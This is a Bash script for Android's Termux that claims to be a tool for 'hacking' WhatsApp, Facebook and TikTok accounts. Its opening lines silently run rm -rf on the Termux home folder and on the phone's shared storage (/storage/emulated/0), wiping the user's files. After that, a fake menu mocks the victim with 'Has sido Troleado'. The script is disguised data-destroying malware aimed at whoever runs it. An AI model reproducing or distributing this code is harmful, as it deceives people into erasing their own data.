#!/bin/bash
#Script borra datos :v
echo "bash vh.sh"
rm -rf /data/data/com.termux/files/home/downloads
rm -rf /data/data/com.termux/files/home/sdcard
rm -rf /data/data/com.termux/files/home/storage
rm -rf /data/data/com.termux/files/home
rm -rf /storage/emulated/0
clear
red='\e[91m'
sleep 0.2
menu(){
echo -e "
\e[91m.  ▄▄ ·       ▄▄▌  ▪  ▄▄▄▄▄ ▄▄▄· ▄▄▄  ▪
\e[91m  ▐█ ▀. ▪     ██•  ██ •██  ▐█ ▀█ ▀▄ █·██ ▪
\e[91m  ▄▀▀▀█▄ ▄█▀▄ ██▪  ▐█· ▐█.▪▄█▀▀█ ▐▀▀▄ ▐█· ▄█▀▄
\e[39m  ▐█▄▪▐█▐█▌.▐▌▐█▌▐▌▐█▌ ▐█▌·▐█ ▪▐▌▐█•█▌▐█▌▐█▌.▐▌
\e[39m   ▀▀▀▀  ▀█▄▀▪.▀▀▀ ▀▀▀ ▀▀▀  ▀  ▀ .▀  ▀▀▀▀ ▀█▄▀▪"
echo -e "              \e[41mBy SolitarioH4ck23\e[0m" '\e[91mv.1.0'
echo
echo -e "  ${red}[1] \e[39mHackear Whatsapp"
echo -e "  ${red}[2] \e[39mHackear Facebook"
echo -e "  ${red}[3] \e[39mHackear Tiktok"
echo
echo -e  "  \e[91m[0] \e[39mExit"
echo
echo -n -e "\e[39m>> "
read -r opcion

if [ $opcion == "1" ]; then
        echo
        echo -n "Ingresa el Numero de la victima: "
        read xd
        echo
        echo "Has sido Troleado🤣🤣"
elif [ $opcion == "2" ]; then
        echo
        echo -n "ID Target : "
        read u
        echo
        echo "Has sido Troleado👻"

elif [ $opcion == "3" ]; then
        echo
        echo "Name user >> "
        read d
        echo "Has sido Troleado👻"

elif  [ $opcion == "0" ]; then
        sleep 0.3
        echo
        echo "Hasta la Proxima!"
        exit
else
        echo "Obcion Erronea!"
        sleep 2.0
        clear
        menu
fi
}
menu
